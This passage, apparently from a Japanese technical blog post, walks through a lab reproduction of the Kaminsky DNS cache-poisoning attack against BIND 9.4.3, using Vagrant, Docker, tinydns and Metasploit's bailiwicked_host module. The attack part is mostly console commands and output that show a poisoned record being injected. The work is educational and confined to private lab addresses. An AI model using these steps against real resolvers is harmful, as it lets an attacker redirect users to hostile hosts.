Kaminsky\uff09\u6c0f\u304c\u767a\u8868\u3057\u305fDNS\u30ad\u30e3\u30c3\u30b7\u30e5\u30dd\u30a4\u30ba\u30cb\u30f3\u30b0\u306e\u65b0\u305f\u306a\u653b\u6483\u65b9\u6cd5\u3067\u3059\u3002\u8a73\u7d30\u306f\u53c2\u8003\u30da\u30fc\u30b8\u3092\u3054\u89a7\u304f\u3060\u3055\u3044\u3002\n\u3053\u306e\u653b\u6483\u65b9\u6cd5\u304c\u767a\u898b\u3055\u308c\u305f\u306e\u306f\u304b\u306a\u308a\u6614\u3067\u306f\u3042\u308a\u307e\u3059\u304c\u3001\u5b9f\u969b\u306b\u81ea\u5206\u3067\u6bd2\u3092\u5165\u308c\u3066\u307f\u306a\u3044\u3068\u7406\u89e3\u304c\u6d45\u3044\u304b\u306a\u3068\u3044\u3046\u3053\u3068\u3067\u8a66\u3057\u3066\u307f\u307e\u3057\u305f\u3002\nKaminsky Attack\u306f\u77e5\u3063\u3066\u3044\u308b\u3082\u306e\u3068\u3057\u3066\u3001\u5b9f\u9a13\u306e\u65b9\u6cd5\u3060\u3051\u66f8\u3044\u3066\u304a\u304d\u307e\u3059\u3002\n\n#\u53c2\u8003\n- https://www.nic.ad.jp/ja/materials/iw/2008/proceedings/H3/IW2008-H3-07.pdf\n- https://www.nic.ad.jp/ja/newsletter/No40/0800.html\n- http://www.e-ontap.com/dns/bindmatrix.html\n\n\n#\u74b0\u5883\n\u74b0\u5883\u3068\u3057\u3066\u306f\u3001\u307b\u307c\u53c2\u8003\u30da\u30fc\u30b8\u901a\u308a\u306b\u3084\u308a\u307e\u3057\u305f\u3002\n\u5168\u3066Vagrant\u3067VM\u3092\u4f5c\u6210\u3057\u307e\u3057\u305f\uff08\u5168\u90e8Docker\u3067\u3084\u308c\u3070\u826f\u304b\u3063\u305f\u306a\u3001\u3068\u5f8c\u3067\u601d\u3044\u307e\u3057\u305f\uff09\u3002\n\n- \u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\t- 192.168.33.10\n- \u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\t- 192.168.33.11\n- \u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\n\t- 192.168.33.12\n\n\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u611f\u3058\u3067\u3059\u3002\n![Kobito.gTErow.png](https://qiita-image-store.s3.amazonaws.com/0/56222/c11f41c0-7383-3414-46d8-ed7dbe33b3ee.png \"Kobito.gTErow.png\")\n\n\n\n\n#\u5b9f\u9a13\n\n## \u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\u53c2\u8003\u30da\u30fc\u30b8\u306b\u3088\u308b\u3068\u3001Kaminsky Attack\u306fDNS\u81ea\u4f53\u306e\u8106\u5f31\u6027\u3067\u306f\u306a\u304f\u5b9f\u88c5\u306e\u554f\u984c\u3068\u3044\u3046\u3053\u3068\u306e\u3088\u3046\u3067\u3059\u3002\nBIND\u306e\u7279\u5b9a\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u306b\u306f\u6bd2\u3092\u5165\u308c\u308b\u3053\u3068\u304c\u51fa\u6765\u308b\u3088\u3046\u306a\u306e\u3067\u3001\u4eca\u56de\u306f9.4.3\u3092\u4f7f\u3063\u3066\u307f\u307e\u3059\u3002\n\u88ab\u653b\u6483\u30b5\u30fc\u30d0\u3067\u306fBIND\u3092\u52d5\u304b\u3057\u3001\u30ad\u30e3\u30c3\u30b7\u30e5DNS\u30b5\u30fc\u30d0\u3068\u3057\u3066\u52d5\u4f5c\u3055\u305b\u307e\u3059\u3002\n\n### VM\u306e\u7528\u610f\nVagrant\u3067192.168.33.10\u3092\u6307\u5b9a\u3057\u3066\u8d77\u52d5\u3057\u307e\u3059\u3002\n\u4eca\u56de\u306f\u4e88\u3081\u7528\u610f\u3057\u3066\u304a\u3044\u305fCentOS 6.8\u306ebox\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3057\u307e\u3057\u305f\u3002\n\n```\n$ vagrant init centos68\n$ vim Vagrantfile\nconfig.vm.network \"private_network\", ip: \"192.168.33.10\"\n$ vagrant up\n$ vagrant ssh\n```\n\n\u3053\u308c\u3067VM\u306e\u7528\u610f\u306f\u5b8c\u4e86\u3067\u3059\u3002\n\n### Docker\u306e\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\n\u74b0\u5883\u3092Docker\u3067\u4f5c\u3063\u305f\u307b\u3046\u304c\u5f8c\u3067\u697d\u3060\u3068\u601d\u3063\u305f\u306e\u3067Docker\u3067\u4f5c\u6210\u3057\u307e\u3057\u305f\u3002\n\u307e\u305a\u6700\u521d\u306bDocker\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u307e\u3059\u3002\n\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u624b\u9806\u306f\u4ee5\u4e0b\u306a\u3069\u3092\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\nhttp://qiita.com/zwirky/items/991f61a231f4e198a320\n\n\n### Docker\u30b3\u30f3\u30c6\u30ca\u306e\u8d77\u52d5\n\u4ed6\u306e\u74b0\u5883\u3067\u3082\u5b9f\u9a13\u3057\u3084\u3059\u3044\u3088\u3046\u306b\u3001Docker\u30a4\u30e1\u30fc\u30b8\u3092\u4f5c\u308a\u307e\u3057\u305f\u3002\n\u4ee5\u4e0b\u306e\u30b3\u30de\u30f3\u30c9\u3067\u8d77\u52d5\u3057\u307e\u3059\u3002\n\n```\n# docker run -d -p 53:53/udp knqyf263/docker-kaminsky\n```\n\n\u3053\u308c\u3067\u6e96\u5099\u306f\u5b8c\u4e86\u3067\u3059\u304c\u3001\u5177\u4f53\u7684\u306b\u4f55\u3092\u3057\u305f\u304b\u3082\u8aac\u660e\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n\u57fa\u672c\u7684\u306b\u306f\u666e\u901a\u306eBIND\u306e\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u624b\u9806\u901a\u308a\u3067\u3059\u3002\n\u81ea\u5206\u3067\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u305f\u3044\u4eba\u306f\u4ee5\u4e0b\u306a\u3069\u3092\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\nhttp://qiita.com/na0AaooQ/items/9ed548dd6db2a0c911c4\n\nDockerfile\u3092\u898b\u308c\u3070\u96f0\u56f2\u6c17\u306f\u3064\u304b\u3081\u308b\u3068\u601d\u3044\u307e\u3059\u3002\nhttps://github.com/knqyf263/docker-kaminsky/blob/master/Dockerfile\n\n#### \u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u306e\u56fa\u5b9a\nKaminsky Attack\u3067\u306f\u6bd2\u3092\u5165\u308c\u308b\u969b\u306b\u554f\u3044\u5408\u308f\u305b\u6642\u306e\u30dd\u30fc\u30c8\u3092\u4e88\u60f3\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\n\u30e9\u30f3\u30c0\u30e0\u3060\u3068\u8a66\u884c\u56de\u6570\u304c\u591a\u304f\u306a\u3063\u3066\u3057\u307e\u3046\u305f\u3081\u3001\u7c21\u5358\u306e\u305f\u3081\u56fa\u5b9a\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n\u56fa\u5b9a\u3057\u306a\u304f\u3066\u3082\u53ef\u80fd\u306a\u306f\u305a\u3067\u3059\u3002\n\n\u4ee5\u4e0b\u3067\u306f10000\u756a\u306b\u56fa\u5b9a\u3057\u3066\u3044\u307e\u3059\u3002\n\n```\n$ vim /etc/named.conf\n...\nquery-source address * port 10000;\n```\n\n#### hint\u30d5\u30a1\u30a4\u30eb\u306e\u66f4\u65b0\n\u30eb\u30fc\u30c8DNS\u30b5\u30fc\u30d0\u3068\u3057\u3066\u81ea\u5206\u306e\u5efa\u3066\u305f\u30b5\u30fc\u30d0\u3092\u898b\u306b\u884c\u3063\u3066\u307b\u3057\u304b\u3063\u305f\u306e\u3067\u3001hint\u30d5\u30a1\u30a4\u30eb\u3092\u66f4\u65b0\u3057\u307e\u3059\u3002\n\u4eca\u56de\u3067\u306f192.168.33.11\u306b\u5411\u3051\u307e\u3059\u3002\n\n```\n$ vim /etc/cache.db\n.                        3600000      NS    A.ROOT-SERVERS.NET.\nA.ROOT-SERVERS.NET.      3600000      A     192.168.33.11\n```\n\n\u3053\u3046\u3059\u308b\u3053\u3068\u3067\u4f55\u306e\u30c9\u30e1\u30a4\u30f3\u540d\u3092\u554f\u3044\u5408\u308f\u305b\u3066\u3082\u3001\u307e\u305a\u306f192.168.33.11\u306b\u554f\u3044\u5408\u308f\u305b\u308b\u3088\u3046\u306b\u306a\u308b\u306f\u305a\u3067\u3059\u3002\n\u305d\u3057\u3066named.conf\u306b\u3053\u306ehint\u30d5\u30a1\u30a4\u30eb\u3092\u6307\u5b9a\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n\n```\n$ vim /etc/named.conf\n...\uff08\u7565\uff09...\nzone \".\" {\n        type hint;\n        file \"/etc/cache.db\";\n};\n\n```\n\n## \u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\u6a29\u5a01DNS\u30b5\u30fc\u30d0\u306e\u8a2d\u5b9a\u3092\u3057\u307e\u3059\u3002\n\u3053\u3061\u3089\u306ftinydns\u3092\u5229\u7528\u3057\u307e\u3057\u305f\u304c\u3001tinydns\u306eDocker\u304c\u3042\u3063\u305f\u306e\u3067\u305d\u308c\u3092\u4f7f\u3044\u307e\u3057\u305f\u3002\nzone\u3068\u3057\u3066`.`\u3068`example.com.`\u3092\u7ba1\u7406\u3059\u308b\u3053\u3068\u306b\u3057\u307e\u3059\u3002\n\u30eb\u30fc\u30c8DNS\u30b5\u30fc\u30d0\u3068example.com\u6a29\u5a01DNS\u30b5\u30fc\u30d0\u306f\u5206\u3051\u3066\u3082\u826f\u304b\u3063\u305f\u306e\u3067\u3059\u304c\u3001\u4e00\u7dd2\u3067\u3082\u5b9f\u9a13\u306f\u53ef\u80fd\u304b\u3068\u601d\u3063\u305f\u306e\u3067\u4e00\u7dd2\u306b\u3057\u307e\u3057\u305f\u3002\n\n### VM\u306e\u7528\u610f\nIP\u30a2\u30c9\u30ec\u30b9\u4ee5\u5916\u306f\u4e0a\u3068\u540c\u3058\u3067\u3059\u3002\nVagrant\u3067192.168.33.11\u3092\u6307\u5b9a\u3057\u3066\u8d77\u52d5\u3057\u307e\u3059\u3002\nwww.example.com\u306f192.168.33.100\u306a\u3069\u9069\u5f53\u306aIP\u30a2\u30c9\u30ec\u30b9\u3092\u6307\u5b9a\u3057\u307e\u3057\u305f\u3002\n\n```\n$ vagrant init centos68\n$ vim Vagrantfile\nconfig.vm.network \"private_network\", ip: \"192.168.33.11\"\n$ vagrant up\n$ vagrant ssh\n```\n\n### Docker\u306e\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\n\u4e0a\u3068\u540c\u69d8\u306b\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u307e\u3059\u3002\n\n### Docker\u30b3\u30f3\u30c6\u30ca\u306e\u8d77\u52d5\n\u4ee5\u4e0b\u306e\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3055\u305b\u3066\u3044\u305f\u3060\u304d\u307e\u3057\u305f\u3002\nhttps://github.com/skurtzemann/docker-tinydns\n\ntinydns.data\u30d5\u30a1\u30a4\u30eb\u3092\u4f5c\u6210\u3057\u3066\u30b3\u30f3\u30c6\u30ca\u8d77\u52d5\u6642\u306b\u30de\u30a6\u30f3\u30c8\u3059\u308c\u3070\u826f\u3044\u3088\u3046\u3067\u3059\u3002\nns\u3068\u3057\u3066\u81ea\u5206\u3092\u6307\u5b9a\u3057\u305f\u304b\u3063\u305f\u306e\u3067192.168.33.11\u306b\u3057\u307e\u3059\u3002\n\n```\n$ vim tinydns.data\n.:192.168.33.11:ns.toor.tss:518400\n.example.com:192.168.33.11:ns.example.com:3600\n+www.example.com:192.168.33.100\n```\n\n\u305d\u3057\u3066\u3053\u306e\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308b\u4f4d\u7f6e\u3067\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30b3\u30de\u30f3\u30c9\u3092\u6253\u3061\u307e\u3059\u3002\n\n```\n$ docker run -d -v `pwd`:/data -p 53:53/udp skurtzemann/tinydns\n```\n\n\u3053\u308c\u3067tinydns\u81ea\u4f53\u306f\u8d77\u52d5\u5b8c\u4e86\u3067\u3059\u3002\n\n### \u30c6\u30b9\u30c8\n\u6b63\u3057\u304fexample.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u304c\u5f15\u3051\u308b\u304b\u78ba\u8a8d\u3057\u3066\u307f\u307e\u3059\u3002\n\n```\n[root@localhost vagrant]# dig @127.0.0.1 ns example.com\n\n; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.3 <<>> @127.0.0.1 ns example.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63977\n;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n;; WARNING: recursion requested but not available\n\n;; QUESTION SECTION:\n;example.com.                   IN      NS\n\n;; ANSWER SECTION:\nexample.com.            3600    IN      NS      ns.example.com.\n\n;; ADDITIONAL SECTION:\nns.example.com.         3600    IN      A       192.168.33.11\n\n;; Query time: 1 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Sun Dec 25 11:15:46 2016\n;; MSG SIZE  rcvd: 62\n```\n\n192.168.33.11\u304c\u8fd4\u3063\u3066\u6765\u3066\u3044\u308b\u306e\u3067\u554f\u984c\u306a\u3055\u305d\u3046\u3067\u3059\u3002\n\u307e\u305f\u3001\u4eca\u56de\u306e\u653b\u6483\u5bfe\u8c61\u3067\u3042\u308bBIND\u30b5\u30fc\u30d0\u306b\u5bfe\u3057\u3066\u3082\u554f\u3044\u5408\u308f\u305b\u3066\u307f\u307e\u3059\u3002\n\n```\n[root@localhost vagrant]# dig @192.168.33.10 ns example.com +short\nns.example.com.\n```\n\n\u6b63\u3057\u304f\u8a2d\u5b9a\u3067\u304d\u3066\u3044\u308b\u3088\u3046\u3067\u3059\uff08\u672c\u6765\u306a\u3089 `a.iana-servers.net.` \u306a\u3069\u304c\u8fd4\u3055\u308c\u308b\uff09\u3002\n\u3053\u308c\u3067DNS\u30b5\u30fc\u30d0\u306e\u6e96\u5099\u306f\u5b8c\u4e86\u3067\u3059\u3002\n\n### \u9045\u5ef6\u306e\u8a2d\u5b9a\n\u6a29\u5a01DNS\u30b5\u30fc\u30d0\u304b\u3089\u306e\u30ec\u30b9\u30dd\u30f3\u30b9\u304c\u9045\u3044\u307b\u3046\u304c\u653b\u6483\u304c\u6210\u529f\u3057\u3084\u3059\u3044\u306e\u3067\u3001\u9045\u5ef6\u3092\u5165\u308c\u307e\u3059\u3002\nLinux\u306a\u306e\u3067`tc`\u30b3\u30de\u30f3\u30c9\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n\n```\n$ sudo tc qdisc add dev eth1 root netem delay 200ms\n```\n\n\u4e0a\u8a18\u3067\u306f200ms\u306e\u9045\u5ef6\u3092\u5165\u308c\u307e\u3057\u305f\u3002\nVagrant\u3067\u8d77\u52d5\u3057\u305f\u3089eth1\u304c192.168.33.11\u306b\u5272\u5f53\u305f\u3063\u3066\u3044\u305f\u306e\u3067eth1\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\n\n\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u304b\u3089ping\u3092\u6253\u3063\u3066\u307f\u307e\u3059\u3002\n\n```\n[root@localhost ~]# ping -c 3 192.168.33.11\nPING 192.168.33.11 (192.168.33.11) 56(84) bytes of data.\n64 bytes from 192.168.33.11: icmp_seq=1 ttl=64 time=202 ms\n64 bytes from 192.168.33.11: icmp_seq=2 ttl=64 time=202 ms\n64 bytes from 192.168.33.11: icmp_seq=3 ttl=64 time=201 ms\n\n--- 192.168.33.11 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2204ms\nrtt min/avg/max/mdev = 201.991/202.143/202.381/0.170 ms\n```\n\n\u6b63\u3057\u304f200ms\u306e\u9045\u5ef6\u304c\u767a\u751f\u3057\u3066\u3044\u307e\u3059\u3002\n\n## \u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\n\u6700\u5f8c\u306b\u653b\u6483\u8005\u30b5\u30fc\u30d0\u3092\u7528\u610f\u3057\u307e\u3059\u3002\nMetasploit Framework\uff08\u4ee5\u4e0bMetasploit\uff09\u304c\u5229\u7528\u3057\u305f\u304b\u3063\u305f\u306e\u3067\u3001Kali Linux\u3092\u5229\u7528\u3057\u307e\u3057\u305f\u3002\n\n### VM\u306e\u7528\u610f\n\u4e8b\u524d\u306b\u7528\u610f\u3057\u3066\u304a\u3044\u305fKali Linux\u306ebox\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n\n```\n$ vagrant init kali\n$ vim Vagrantfile\nconfig.vm.network \"private_network\", ip: \"192.168.33.12\"\n$ vagrant up\n$ vagrant ssh\n```\n\n### \u653b\u6483\u3059\u308b\nmsfconsole\u3092\u8d77\u52d5\u3057\u305f\u3042\u3068\u3001bailiwicked_host\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n\n```\n$ sudo msfconsole\nmsf > use auxiliary/spoof/dns/bailiwicked_host\nmsf auxiliary(bailiwicked_host) >\n```\n\n\u30aa\u30d7\u30b7\u30e7\u30f3\u306f\u4ee5\u4e0b\u3067\u3059\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > show options\n\nModule options (auxiliary/spoof/dns/bailiwicked_host):\n\n   Name       Current Setting    Required  Description\n   ----       ---------------    --------  -----------\n   HOSTNAME   pwned.example.com  yes       Hostname to hijack\n   INTERFACE                     no        The name of the interface\n   NEWADDR    1.3.3.7            yes       New address for hostname\n   RECONS     208.67.222.222     yes       The nameserver used for reconnaissance\n   RHOST                         yes       The target address\n   SNAPLEN    65535              yes       The number of bytes to capture\n   SRCADDR    Real               yes       The source address to use for sending the queries (Accepted: Real, Random)\n   SRCPORT                       yes       The target server's source query port (0 for automatic)\n   TIMEOUT    500                yes       The number of seconds to wait for new data\n   TTL        39223              yes       The TTL for the malicious host entry\n   XIDS       0                  yes       The number of XIDs to try for each query (0 for automatic)\n```\n\n\u4eca\u56de\u306e\u653b\u6483\u5bfe\u8c61\u306f192.168.33.10\u306a\u306e\u3067RHOST\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > set RHOST 192.168.33.10\nRHOST => 192.168.33.10\n```\n\n\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u306e\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u306f10000\u756a\u306b\u56fa\u5b9a\u3057\u305f\u306e\u3067\u3001SRCPORT\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\n\u305f\u3060\u3057\u3001\u3053\u3053\u30671\u3064\u554f\u984c\u304c\u3042\u308a\u307e\u3059\u3002\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u3092\u56fa\u5b9a\u3057\u305f\u306e\u306fDocker\u306e\u30b3\u30f3\u30c6\u30ca\u5185\u306e\u8a71\u3067\u3001\u30db\u30b9\u30c8\u304b\u3089\u901a\u4fe1\u304c\u51fa\u308b\u969b\u306bNAPT\u3055\u308c\u3066\u3057\u307e\u3044\u307e\u3059\u3002\n\u305d\u3053\u3067\u3001\u5148\u306b\u30dd\u30fc\u30c8\u3092\u8abf\u3079\u3066\u304a\u304d\u307e\u3059\u3002\n\u307e\u305a\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u3067dig\u306a\u3069\u3067\u3057\u3064\u3064\u3001\u30eb\u30fc\u30c8\u30b5\u30fc\u30d0\u3067\u4ee5\u4e0b\u306e\u3088\u3046\u306btcpdump\u3092\u3057\u3066\u304a\u304d\u307e\u3059\u3002\n\n```\n[root@localhost vagrant]# tcpdump -nnni eth1\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes\n14:27:05.069187 IP 192.168.33.10.10000 > 192.168.33.11.53: 9343 [1au] NS? . (28)\n```\n\n\u3053\u3046\u3059\u308b\u3068\u4e0a\u8a18\u306e\u3088\u3046\u306b\u3001\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\u306e\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u304c\u5206\u304b\u308a\u307e\u3059\u3002\n\u4eca\u56de\u306f\u5909\u63db\u3055\u308c\u305a10000\u756a\u30dd\u30fc\u30c8\u306e\u307e\u307e\u3067\u3057\u305f\u3002\n\u74b0\u5883\u306b\u3088\u3063\u3066\u306f\u7570\u306a\u308b\u30dd\u30fc\u30c8\u306a\u3069\u306b\u306a\u308b\u306e\u3067\u8abf\u3079\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > set SRCPORT 10000\nSRCPORT => 10000\n```\n\n\u4eca\u56de\u306fwww.example.com\u3092\u6c5a\u67d3\u3057\u305f\u3044\u306e\u3067HOSTNAME\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > set HOSTNAME www.example.com\nHOSTNAME => www.example.com\n```\n\nVagrant\u3067\u306f192.168.33.12\u3092eth1\u306b\u5272\u308a\u5f53\u3066\u3066\u3044\u308b\u306e\u3067\u3001INTERFACE\u306b\u306feth1\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\n\u6700\u521d\u3053\u308c\u3092\u6307\u5b9a\u3057\u3066\u3044\u306a\u304b\u3063\u305f\u305f\u3081\u3001eth0\u304b\u3089\u30d1\u30b1\u30c3\u30c8\u304c\u51fa\u3066\u3057\u307e\u3063\u3066\u3046\u307e\u304f\u884c\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > set INTERFACE eth1\nINTERFACE => eth1\n```\n\n\u6b21\u306b\u3001RECONS\u3092\u6307\u5b9a\u3057\u307e\u3059\u3002\nKaminsky Attack\u3067\u306f\u30bd\u30fc\u30b9\u30a2\u30c9\u30ec\u30b9\u306e\u507d\u88c5\u3092\u884c\u3044\u307e\u3059\u304c\u3001bailiwicked_host\u30e2\u30b8\u30e5\u30fc\u30eb\u3067\u306f\u81ea\u52d5\u3067\u507d\u88c5\u3059\u308b\u3079\u304d\u30a2\u30c9\u30ec\u30b9\u3092\u63a2\u3057\u3066\u304f\u308c\u307e\u3059\u3002\n\u305d\u306e\u969b\u3001example.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u3092\u5f15\u3044\u3066\u304d\u3066\u3001\u305d\u306e\u30a2\u30c9\u30ec\u30b9\u306b\u507d\u88c5\u3059\u308b\u306e\u3067\u3059\u304c\u3001\u4eca\u56de\u306f\u672c\u6765\u306e\u30a2\u30c9\u30ec\u30b9\u306b\u507d\u88c5\u3055\u308c\u308b\u3068\u4e0a\u624b\u304f\u884c\u304d\u307e\u305b\u3093\u3002\n\u305d\u3053\u3067\u3001example.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u3092\u5f15\u304f\u5148\u3092192.168.33.11\u306b\u6307\u5b9a\u3057\u307e\u3059\u3002\n192.168.33.11\u306b\u554f\u3044\u5408\u308f\u305b\u308b\u3068\u3001example.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u306f192.168.33.11\u304c\u8fd4\u3055\u308c\u308b\u306e\u3067\u3001192.168.33.11\u306b\u507d\u88c5\u3057\u3066\u304f\u308c\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\n\uff08\u3068\u3044\u3046\u7406\u89e3\u3067\u3059\u304c\u3001\u3082\u3057\u9055\u3063\u3066\u305f\u3089\u3059\u307f\u307e\u305b\u3093\u3002\uff09\n\n```\nmsf auxiliary(bailiwicked_host) > set RECONS 192.168.33.11\nRECONS => 192.168.33.11\n```\n\n\u3053\u308c\u3067\u6e96\u5099\u5b8c\u4e86\u3057\u305f\u306e\u3067\u653b\u6483\u3057\u3066\u307f\u307e\u3057\u3087\u3046\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > run\n\n[*] Targeting nameserver 192.168.33.10 for injection of www.example.com. as 1.3.3.7\n[*] Querying recon nameserver for example.com.'s nameservers...\n[*]  Got an NS record: example.com.            3600    IN      NS      ns.example.com.\n[*]   Querying recon nameserver for address of ns.example.com....\n[*]    Got an A record: ns.example.com.         3600    IN      A       192.168.33.11\n[*]     Checking Authoritativeness: Querying 192.168.33.11 for example.com....\n[*]     ns.example.com. is authoritative for example.com., adding to list of nameservers to spoof as\n[*] Calculating the number of spoofed replies to send per query...\n[*]   race calc: 100 queries | min/max/avg time: 0.3/0.32/0.3 | min/max/avg replies: 291/651/516\n[*] Sending 774 spoofed replies from each nameserver (1) for each query\n[*] Attempting to inject a poison record for www.example.com. into 192.168.33.10:1025...\n[*] Poisoning successful after 250 queries and 193500 responses: www.example.com == 1.3.3.7\n[*] TTL: 39116 DATA: #<Resolv::DNS::Resource::IN::A:0x00000005936430>\n[*] Auxiliary module execution completed\n```\n\n\u5c11\u3057\u5f85\u3064\u3068\u4e0a\u8a18\u306e\u3088\u3046\u306b\u653b\u6483\u304c\u6210\u529f\u3057\u305f\u3053\u3068\u304c\u5206\u304b\u308a\u307e\u3059\u3002\n\u88ab\u653b\u6483\u30b5\u30fc\u30d0\u306bwww.example.com\u3092\u554f\u3044\u5408\u308f\u305b\u308b\u30681.3.3.7\u304c\u8fd4\u3055\u308c\u307e\u3059\u3002\n\n```\n[root@localhost ~]# dig @127.0.0.1 www.example.com +short\n1.3.3.7\n```\n\n\u305f\u3060\u3057\u3001\u5834\u5408\u306b\u3088\u3063\u3066\u306f\u6642\u9593\u304c\u304b\u304b\u308b\u3053\u3068\u3082\u3042\u308a\u307e\u3059\u3002\n\n# \u307e\u3068\u3081\nKaminsky Attack\u3092\u81ea\u5206\u3067\u691c\u8a3c\u3057\u3066\u307f\u307e\u3057\u305f\u3002\nBIND 9.4.3\u3067\u306fMetasploit\u306e\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u4f7f\u3063\u3066\u6bd2\u3092\u5165\u308c\u308b\u3053\u3068\u304c\u51fa\u6765\u307e\u3057\u305f\u3002\n\u5b9f\u9a13\u3067\u306f\u30bd\u30fc\u30b9\u30dd\u30fc\u30c8\u3092\u56fa\u5b9a\u3057\u305f\u306e\u3067\u7c21\u5358\u3067\u3057\u305f\u304c\u3001\u56fa\u5b9a\u3057\u306a\u3044\u3068\u5272\u3068\u6642\u9593\u304c\u304b\u304b\u308a\u307e\u3059\u3002\n\u4ed6\u306e\u30d0\u30fc\u30b8\u30e7\u30f3\u3067\u306fAdditional Section\u306eA\u30ec\u30b3\u30fc\u30c9\u3092\u53d7\u3051\u5165\u308c\u306a\u3044\u304b\u3089\u6bd2\u304c\u5165\u3089\u306a\u3044\u3068\u3044\u3046\u3053\u3068\u3089\u3057\u3044\u306e\u3067\u3001\u6b21\u306f\u5225\u30d0\u30fc\u30b8\u30e7\u30f3\u3067\u8a66\u3057\u3066\u307f\u3088\u3046\u3068\u601d\u3044\u307e\u3059\u3002\n", "tags": ["bind", "\u8106\u5f31\u6027", "dns", "metasploit", "KaliLinux"]}